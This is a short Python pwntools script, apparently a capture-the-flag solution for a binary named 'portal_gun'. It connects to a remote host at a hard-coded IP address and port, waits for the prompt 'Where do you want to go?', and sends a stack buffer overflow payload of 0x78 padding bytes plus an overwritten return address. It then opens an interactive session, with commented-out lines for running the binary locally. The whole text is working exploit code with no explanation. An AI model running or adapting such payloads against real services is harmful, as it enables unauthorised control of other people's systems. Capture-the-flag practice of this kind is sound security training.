from pwn import * 

p = remote('60.250.197.227', 10002)
#p = process('./portal_gun',env={"LD_PRELOAD" : "./hook.so"})

#p = process('./portal_gun')

# pause()

print(p.recvuntil('Where do you want to go?'))

address = p64(0x4006ec)
payload = b'A' * 0x78 + address

p.sendline(payload)

p.interactive()
